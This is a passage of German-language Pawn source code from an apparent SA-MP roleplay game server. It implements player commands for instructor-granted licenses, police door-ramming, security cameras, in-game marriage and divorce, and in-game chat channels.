				    SendClientMessage(playerid, COLOR_WHITE, "Benutzung: /givelicense [Schein] [playerid/Name]");
				    SendClientMessage(playerid, COLOR_WHITE, "Scheine: fahren, fliegen, fischen, Boot, Motorrad, Roller, LKW, Waffe");
					return 1;
				}
			    if(strcmp(x_nr,"fahren",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /givelicense fahren [Spieler ID / Name]");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        GetPlayerName(playerid, sendername, sizeof(sendername));
					        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				            format(string, sizeof(string), "* Du hast %s eine Fahrlizens gegeben..",giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* Lehrer %s hat dir eine Fahrlicense gegeben.",sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pCarLic] = 1;
					        return 1;
				        }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"fliegen",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /givelicense fliegen [Spieler ID / Name]");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        GetPlayerName(playerid, sendername, sizeof(sendername));
					        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				            format(string, sizeof(string), "* Du hast %s einen Flugschein gegeben.",giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "*Lehrer %s hat dir einen Flugschein gegeben.",sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pFlyLic] = 1;
					        return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"boot",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /givelicense boot [Spieler ID / Name]");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        GetPlayerName(playerid, sendername, sizeof(sendername));
					        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				            format(string, sizeof(string), "* Du hast %s einen Bootschein gegeben.",giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* Lehrer %s hat dir einen Bootschein gegeben.",sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pBoatLic] = 1;
					        return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"fischen",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /givelicense fischen [Spieler ID / Name");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        GetPlayerName(playerid, sendername, sizeof(sendername));
					        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				            format(string, sizeof(string), "* Du hast %s eine Angellizens gegeben.",giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* Lehrer %s hat dir eine Angellizens gegeben.",sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pFishLic] = 1;
					        return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"LKW",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /givelicense LKW [Spieler ID / Name");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        GetPlayerName(playerid, sendername, sizeof(sendername));
					        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				            format(string, sizeof(string), "* Du hast %s ein LKW Schein gegeben.",giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* Lehrer %s hat dir ein LKW Schein gegeben.",sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pLKWLic] = 1;
					        return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"Motorrad",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /givelicense Motorrad [Spieler ID / Name");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        GetPlayerName(playerid, sendername, sizeof(sendername));
					        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				            format(string, sizeof(string), "* Du hast %s ein Motorad Schein gegeben.",giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* Lehrer %s hat dir ein Motorad Schein gegeben.",sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pMotoLic] = 1;
					        return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"Roller",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /givelicense Roller [Spieler ID / Name]");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        GetPlayerName(playerid, sendername, sizeof(sendername));
					        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				            format(string, sizeof(string), "* Du hast %s einen Rollerschein gegeben.",giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* Lehrer %s hat dir einen Rollerschein gegeben.",sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pRollerLic] = 1;
					        return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist Offline !");
					    return 1;
					}
				}
				else if(strcmp(x_nr,"waffen",true) == 0)
				{
		            tmp = strtoknew(cmdtext, idx);
					if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /givelicense waffen [Spieler ID / Name]");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        if(PlayerInfo[giveplayerid][pLevel] < 5 && !IsACop(giveplayerid))
					        {
								SendClientMessage(playerid, COLOR_GRAD1, "Der Spieler ist nicht Level 5!");
								return 1;
							}
					        GetPlayerName(playerid, sendername, sizeof(sendername));
					        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				            format(string, sizeof(string), "* Du hast %s einen Waffenschein gegeben.",giveplayer);
					        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					        format(string, sizeof(string), "* Lehrer %s hat dir einen Waffenschein gegeben.",sendername);
					        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        PlayerInfo[giveplayerid][pGunLic] = 1;
					        return 1;
						}
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
					    return 1;
					}
				}
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_GREY, "Du bist kein Fahrlehrer !");
	            return 1;
	        }
	    }
	    return 1;
	}
	if(strcmp(cmd, "/startlesson", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(IsAnInstructor(playerid))
	        {
	            tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /startlesson [playerid");
				    return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
				        GetPlayerName(playerid, sendername, sizeof(sendername));
				        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				        format(string, sizeof(string), "* Du hast eine Lernstunde für %s gestartet.",giveplayer);
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				        format(string, sizeof(string), "* Fahrlehrer %s hat deine Lernstunde gestartet.",sendername);
				        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				        TakingLesson[giveplayerid] = 1;
				    }
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
				    return 1;
				}
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Fahrlehrer !");
	            return 1;
	        }
	    }
	    return 1;
	}
	if(strcmp(cmd, "/stoplesson", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(IsAnInstructor(playerid))
	        {
	            tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /stoplesson [playerid]");
				    return 1;
				}
				giveplayerid = ReturnUser(tmp);
				if(IsPlayerConnected(giveplayerid))
				{
				    if(giveplayerid != INVALID_PLAYER_ID)
				    {
				        if(TakingLesson[giveplayerid] != 1)
				        {
				            SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler nimmt keine Lernstunden !");
				            return 1;
				        }
				        GetPlayerName(playerid, sendername, sizeof(sendername));
				        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
				        format(string, sizeof(string), "* Du hast die Lernstunde von %s beendet.",giveplayer);
				        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
				        format(string, sizeof(string), "* Fahrlehrer %s hat deine Lernstunde beendet.",sendername);
				        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
				        TakingLesson[giveplayerid] = 0;
				    }
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
				    return 1;
				}
	        }
	        else
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Fahrlehrer !");
	            return 1;
	        }
	    }
	    return 1;
	}
	if(strcmp(cmd, "/ram", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
            if(IsACop(playerid))
            {
                for(new i = 0; i < sizeof(HouseInfo); i++)
				{
					if (IsPlayerInRangeOfPoint(playerid,3.0,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]))
					{
//					    new rand = random(5);
//					    if(rand == 0)
//					    {
						    SetPlayerInterior(playerid,HouseInfo[i][hInt]);
							SetPlayerPos(playerid,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz]);
							GameTextForPlayer(playerid, "~r~Tuer aufgebrochen", 5000, 1);
							PlayerInfo[playerid][pInt] = HouseInfo[i][hInt];
							PlayerInfo[playerid][pLocal] = i;
//						}
					}
				}
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Cop / Bundeswehr !");
            }
		}
		return 1;
	}
	if(strcmp(cmd, "/camera", true) == 0)
	{
	    if(IsPlayerConnected(playerid))
	    {
            if(IsACop(playerid))
            {
                if(!IsPlayerInRangeOfPoint(playerid,8.0,211.6222,1811.9565,21.8594))
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Du bist nicht am Area51 Sicherheitspult !");
				    return 1;
				}
				tmp = strtoknew(cmdtext, idx);
				if(!strlen(tmp)) {
					SendClientMessage(playerid, COLOR_WHITE, "Benutze: /camera [nummer 1 - 6]  (6 = Aus)");
					return 1;
				}
				new number = strval(tmp);
				if(number < 1 || number > 6) { SendClientMessage(playerid, COLOR_GREY, "   Die Kameranummer darf nicht unter 1 oder 6 liegen !"); return 1; }
				FreezePlayer(playerid);
				GetPlayerPos(playerid, Unspec[playerid][Coords][0],Unspec[playerid][Coords][1],Unspec[playerid][Coords][2]);
				if(number == 1) { SetPlayerCameraPos(playerid, 118.1011,1931.3221,22.5527); SetPlayerCameraLookAt(playerid, 98.9656,1920.9819,18.2180); }
				else if(number == 2) { SetPlayerCameraPos(playerid, 213.5340,1875.3075,17.6406); SetPlayerCameraLookAt(playerid, 213.8679,1884.1714,13.8945); }
				else if(number == 3) { SetPlayerCameraPos(playerid, 266.0640,1894.8856,38.6459); SetPlayerCameraLookAt(playerid, 224.0039,1887.1532,17.6406); }
				else if(number == 4) { SetPlayerCameraPos(playerid, 260.8112,1808.0175,38.6303); SetPlayerCameraLookAt(playerid, 227.5645,1818.4778,17.6406); }
				else if(number == 5) { SetPlayerCameraPos(playerid, 114.5196,1814.3483,38.6029); SetPlayerCameraLookAt(playerid, 123.6176,1846.4792,17.6549); }
				else if(number == 6)
				{
				    MedicBill[playerid] = 0;
					UnFreezePlayer(playerid);
					SetSpawnInfo(playerid, PlayerInfo[playerid][pTeam], PlayerInfo[playerid][pModel], Unspec[playerid][Coords][0], Unspec[playerid][Coords][1], Unspec[playerid][Coords][2], 10.0, -1, -1, -1, -1, -1, -1);
					SpawnPlayer(playerid);
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Du bist kein Cop / Soldat !");
			    return 1;
			}
		}
		return 1;
	}
	if(strcmp(cmd,"/scheiden",true)==0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayerInfo[playerid][pMarried] < 1)
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Du bist nicht verheiratet !");
				return 1;
	        }
	        tmp = strtoknew(cmdtext, idx);
			if(!strlen(tmp)) {
				SendClientMessage(playerid, COLOR_WHITE, "Benutze: /scheiden [Playerid]");
				return 1;
			}
			giveplayerid = ReturnUser(tmp);
		    if(IsPlayerConnected(giveplayerid))
			{
			    if(giveplayerid != INVALID_PLAYER_ID)
			    {
			        if (ProxDetectorS(8.0, playerid, giveplayerid))
					{
					    if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst dir nicht selber einen Antrag machen!"); return 1; }
					    new dstring[MAX_PLAYER_NAME];
						new wstring[MAX_PLAYER_NAME];
						GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
						GetPlayerName(playerid, sendername, sizeof(sendername));
						format(string, sizeof(string), "%s", giveplayer);
						strmid(wstring, string, 0, strlen(string), 255);
						format(string, sizeof(string), "%s", PlayerInfo[playerid][pMarriedTo]);
						strmid(dstring, string, 0, strlen(string), 255);
						if(strcmp(dstring ,wstring, true ) == 0 )
						{
						    format(string, sizeof(string), "* Du hast %s die Scheidung eingerreicht.", giveplayer);
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "* %s hat dir die Scheidung eingereicht (tipp /accept scheidung).", sendername);
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
					        DivorceOffer[giveplayerid] = playerid;
					        return 1;
						}
						else
						{
						    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht mit dir Verheiratet !");
						    return 1;
						}
					}
					else
					{
						SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist nicht in deiner Nähe !");
						return 1;
					}
			    }
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist Offline !");
			    return 1;
			}
		}
		return 1;
	}
    if(strcmp(cmd,"/heiraten",true)==0)
    {
        if(IsPlayerConnected(playerid))
        {
	            if(GetPlayerMoneySave(playerid) < 15000)
	            {
	                SendClientMessage(playerid, COLOR_GREY, "   Die Hochzeit kostet $15000 !");
	                return 1;
	            }
	            if(PlayerInfo[playerid][pMarried] > 0)
	            {
	                SendClientMessage(playerid, COLOR_GREY, "   Du bist bereits verheiratet !");
	                return 1;
	            }
	            tmp = strtoknew(cmdtext, idx);
	            if(!strlen(tmp)) {
	                SendClientMessage(playerid, COLOR_RED, "FEHLER: /heiraten [Playerid]");
	                return 1;
	            }
	            giveplayerid = ReturnUser(tmp);
	            if(IsPlayerConnected(giveplayerid))
	            {
	                if(giveplayerid != INVALID_PLAYER_ID)
	                {
	                    if(PlayerInfo[giveplayerid][pMarried] > 0)
	                    {
	                        SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist bereits Verheiratet !");
	                        return 1;
	                    }
	                    if (ProxDetectorS(8.0, playerid, giveplayerid))
	                    {
	                        if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Du kannst dich nicht selbst vorschlagen!"); return 1; }
	                        GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
	                        GetPlayerName(playerid, sendername, sizeof(sendername));
	                        format(string, sizeof(string), "* Du hast %s einen Antrag gemacht.", giveplayer);
	                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	                        format(string, sizeof(string), "* %s hat dir einen Antrag gemacht(tipp /accept heirat).", sendername);
	                        SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
	                        ProposeOffer[giveplayerid] = playerid;
	                    }
	                    else
	                    {
	                        SendClientMessage(playerid, COLOR_GREY, "Der Spieler ist nicht in deiner Nähe !");
	                        return 1;
	                    }
	                }
	            }
	            else
	            {
	                SendClientMessage(playerid, COLOR_GREY, "Dieser Spieler ist Offline !");
	                return 1;
				}
			}
        return 1;
    }
	if(strcmp(cmd,"/irc",true)==0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        new x_nr[256];
			x_nr = strtoknew(cmdtext, idx);
			if(!strlen(x_nr)) {
				SendClientMessage(playerid, COLOR_WHITE, "Benutze: (/irc join [channelnr] or /irc join [channelnr] [password])  (/irc Leave)  (/irc Admins)");
				SendClientMessage(playerid, COLOR_WHITE, "Benutze: /irc [name] [channelnr]");
				SendClientMessage(playerid, COLOR_WHITE, "Verfügbare Namen: MOTD, Password, NeedPass, Lock, Kick, Status");
				return 1;
			}
		    if(strcmp(x_nr,"join",true) == 0)
			{
			    tmp = strtoknew(cmdtext, idx);
			    if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /irc join [channelnr] oder /irc join [channelnr] [password]");
				    return 1;
				}
				new channel = strval(tmp);
				if(channel < 1 || channel > 10) { SendClientMessage(playerid, COLOR_GREY, "   Channel Nummer nicht nidriger als 1 oder höher als 10 !"); return 1; }
				channel -= 1;
			    if(IRCInfo[channel][iLock] == 0)
			    {
			        if(IRCInfo[channel][iNeedPass] == 0)
			        {
			            JoinChannelNr(playerid, channel);
				    }
				    else
				    {
				        tmp = strtoknew(cmdtext, idx);
				        if(!strlen(tmp))
						{
						    SendClientMessage(playerid, COLOR_WHITE, "Du brauchst ein Password um zu Joinen.");
							SendClientMessage(playerid, COLOR_WHITE, "Benutze: /irc join [channelnr] [password]");
							return 1;
						}
						JoinChannel(playerid,channel,tmp);
				    }
			    }
			    else
			    {
			        SendClientMessage(playerid, COLOR_GREY, "   Dieser Channel ist Gesichert !");
				    return 1;
			    }
			}
			else if(strcmp(x_nr,"status",true) == 0)
			{
			    for(new i = 0; i < sizeof(IRCInfo); i++)
			    {
			        format(string, sizeof(string), "Channel %d: %d Spieler Verbunden.",i + 1, IRCInfo[i][iPlayers]);
				    SendClientMessage(playerid, COLOR_WHITE, string);
			    }
			    return 1;
			}
			else if(strcmp(x_nr,"password",true) == 0)
			{
			    tmp = strtoknew(cmdtext, idx);
			    if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /irc password [channelnr] [password]");
				    return 1;
				}
				new channel = strval(tmp);
				if(channel < 1 || channel > 10) { SendClientMessage(playerid, COLOR_GREY, "   Channel Nummer nicht nidriger als 1 oder höher als 10 !"); return 1; }
				channel -= 1;
				new wstring[128];
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "%s", sendername);
				strmid(wstring, string, 0, strlen(string), 255);
				if(strcmp(IRCInfo[channel][iAdmin],wstring, true ) == 0 )
				{
				    tmp = strtoknew(cmdtext, idx);
				    if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /irc password [channelnr] [password]");
					    return 1;
					}
					strmid(IRCInfo[channel][iPassword], tmp, 0, strlen(tmp), 255);
					format(string, sizeof(string), "Du hast das IRC Channel PW geändert auf: %s.",IRCInfo[channel][iPassword]);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					SaveIRC();
					return 1;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Du bist nicht der Admin von dem Channel !");
				    return 1;
				}
			}
			else if(strcmp(x_nr,"needpass",true) == 0)
			{
			    tmp = strtoknew(cmdtext, idx);
			    if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /irc needpass [channelnr]");
				    return 1;
				}
				new channel = strval(tmp);
				if(channel < 1 || channel > 10) { SendClientMessage(playerid, COLOR_GREY, "   Channel Nummer nicht nidirger als 1 oder höher als 10 !"); return 1; }
				channel -= 1;
				new wstring[128];
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "%s", sendername);
				strmid(wstring, string, 0, strlen(string), 255);
				if(strcmp(IRCInfo[channel][iAdmin],wstring, true ) == 0 )
				{
				    if(IRCInfo[channel][iNeedPass] != 0)
				    {
				        IRCInfo[channel][iNeedPass] = 0;
				        SendClientMessage(playerid, COLOR_YELLOW, "Spieler brauchen das IRC Passwort um zu Joinen.");
				    }
					else
					{
					    IRCInfo[channel][iNeedPass] = 1;
						SendClientMessage(playerid, COLOR_YELLOW, "Spieler brauch das PW für den IRC Channel.");
					}
					SaveIRC();
					return 1;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Du bist nicht der Admin von dem Channel !");
				    return 1;
				}
			}
			else if(strcmp(x_nr,"lock",true) == 0)
			{
			    tmp = strtoknew(cmdtext, idx);
			    if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /irc lock [channelnr]");
				    return 1;
				}
				new channel = strval(tmp);
				if(channel < 1 || channel > 10) { SendClientMessage(playerid, COLOR_GREY, "   Channel Nummer nicht nidiriger als 1 oder höher als 10 !"); return 1; }
				channel -= 1;
				new wstring[128];
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "%s", sendername);
				strmid(wstring, string, 0, strlen(string), 255);
				if(strcmp(IRCInfo[channel][iAdmin],wstring, true ) == 0 )
				{
				    if(IRCInfo[channel][iLock] != 0)
				    {
				        IRCInfo[channel][iLock] = 0;
				        SendClientMessage(playerid, COLOR_YELLOW, "Du hast den IRC Channel geöffnet.");
				    }
					else
					{
					    IRCInfo[channel][iLock] = 1;
						SendClientMessage(playerid, COLOR_YELLOW, "Du hast den IRC Channel wieder abgeschlossen.");
					}
					SaveIRC();
					return 1;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Du bist nicht der Admin von diesem Channel !");
				    return 1;
				}
			}
			else if(strcmp(x_nr,"motd",true) == 0)
			{
			    tmp = strtoknew(cmdtext, idx);
			    if(!strlen(tmp))
				{
				    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /irc motd [channelnr] [motdtext]");
				    return 1;
				}
				new channel = strval(tmp);
				if(channel < 1 || channel > 10) { SendClientMessage(playerid, COLOR_GREY, "   Nicht nidirger als 1 oder höher als 10 !"); return 1; }
				channel -= 1;
				new wstring[128];
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "%s", sendername);
				strmid(wstring, string, 0, strlen(string), 255);
				if(strcmp(IRCInfo[channel][iAdmin],wstring, true ) == 0 )
				{
				    new length = strlen(cmdtext);
					while ((idx < length) && (cmdtext[idx] <= ' '))
					{
						idx++;
					}
					new offset = idx;
					new result[64];
					while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
					{
						result[idx - offset] = cmdtext[idx];
						idx++;
					}
					result[idx - offset] = EOS;
					if(!strlen(result))
					{
						SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /irc motd [motdtext]");
						return 1;
					}
					strmid(IRCInfo[channel][iMOTD], result, 0, strlen(result), 255);
					SendClientMessage(playerid, COLOR_YELLOW, "MODT Text geändert.");
					SaveIRC();
					return 1;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Du bist nicht der Channel Admin !");
				    return 1;
				}
			}
			else if(strcmp(x_nr,"leave",true) == 0)
			{
			    if(PlayersChannel[playerid] < 999)
			    {
			        GetPlayerName(playerid, sendername, sizeof(sendername));
			        format(string, sizeof(string), "* %s hat den Channel Verlassen.", sendername);
			        SendIRCMessage(PlayersChannel[playerid], COLOR_GREEN, string);
			        IRCInfo[PlayersChannel[playerid]][iPlayers] -= 1;
			        PlayersChannel[playerid] = 999;
			        return 1;
			    }
			    else
			    {
			        SendClientMessage(playerid, COLOR_GREY, "   Du bist nicht im IRC Channel !");
			        return 1;
			    }
			}
			else if(strcmp(x_nr,"admins",true) == 0)
			{
				for(new i = 0; i < sizeof(IRCInfo); i++)
			    {
				    format(string, sizeof(string), "Channel %d: %s.", i + 1, IRCInfo[i][iAdmin]);
				    SendClientMessage(playerid, COLOR_WHITE, string);
			    }
			    return 1;
			}
			else if(strcmp(x_nr,"kick",true) == 0)
			{
			    if(PlayersChannel[playerid] == 999)
			    {
			        SendClientMessage(playerid, COLOR_GREY, "   Du bist nicht im IRC Channel !");
			        return 1;
			    }
			    new wstring[128];
				GetPlayerName(playerid, sendername, sizeof(sendername));
				format(string, sizeof(string), "%s", sendername);
				strmid(wstring, string, 0, strlen(string), 255);
				if(strcmp(IRCInfo[PlayersChannel[playerid]][iAdmin],wstring, true ) == 0 )
				{
				    tmp = strtoknew(cmdtext, idx);
				    if(!strlen(tmp))
					{
					    SendClientMessage(playerid, COLOR_WHITE, "Benutze: /irc kick [playerid]");
					    return 1;
					}
					giveplayerid = ReturnUser(tmp);
					if(IsPlayerConnected(giveplayerid))
					{
					    if(giveplayerid != INVALID_PLAYER_ID)
					    {
					        if(PlayersChannel[giveplayerid] == PlayersChannel[playerid])
					        {
					            GetPlayerName(playerid, sendername, sizeof(sendername));
					            GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
					            format(string, sizeof(string), "*Du wurdest von %s aus dem Channel gekickt.",giveplayer);
					            SendClientMessage(playerid, COLOR_YELLOW, string);
					            format(string, sizeof(string), "* Du hast mit Channel admin: %s gekickt.",sendername);
					            SendClientMessage(giveplayerid, COLOR_YELLOW, string);
					            format(string, sizeof(string), "* %s hat den Channel Verlassen (Kicked).", sendername);
						        SendIRCMessage(PlayersChannel[playerid], COLOR_GREEN, string);
					            IRCInfo[PlayersChannel[giveplayerid]][iPlayers] -= 1;
					            PlayersChannel[giveplayerid] = 999;
					        }
					        else
					        {
					            SendClientMessage(playerid, COLOR_GREY, "   Dieser Spieler ist nicht im IRC Channel !");
							    return 1;
					        }
					    }
					}
					else
					{
					    SendClientMessage(playerid, COLOR_GREY, "   Der Spieler ist Offline !");
					    return 1;
					}
                }
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   Du bist nicht der Admin von dem Channel !");
				    return 1;
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_GREY, "   Falsche IRC Chanel Nummer ! ");
			    return 1;
			}
		}
		return 1;
 	}
 	if(strcmp(cmd,"/i",true)==0)
	{
	    if(IsPlayerConnected(playerid))
	    {
	        if(PlayersChannel[playerid] == 999)
	        {
	            SendClientMessage(playerid, COLOR_GREY, "   Du bist nicht im IRC Channel !");
	            return 1;
	        }
	        if(PlayerInfo[playerid][pMuted] == 1)
			{
				SendClientMessage(playerid, TEAM_CYAN_COLOR, "Du kannst hier nicht schreiben, weil du gemutet bist!");
				return 1;
			}
			if(PlayerInfo[playerid][pGangJailed] == 1)
			{
			    SendClientMessage(playerid, TEAM_CYAN_COLOR, "Du kannst nicht reden, du bist im GangJail!");
				return 1;
			}
			if(PlayerTied[playerid] == 1)
			{
			    SendClientMessage(playerid, TEAM_CYAN_COLOR, "Du kannst nicht reden, du bist gefesselt!");
				return 1;
			}
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new length = strlen(cmdtext);
			while ((idx < length) && (cmdtext[idx] <= ' '))
			{
				idx++;
			}
			new offset = idx;
			new result[64];
			while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
			{
				result[idx - offset] = cmdtext[idx];
				idx++;
			}
			result[idx - offset] = EOS;
			if(!strlen(result))
			{
				SendClientMessage(playerid, COLOR_GRAD2, "Benutze: /i [irc chat]");
				return 1;
			}
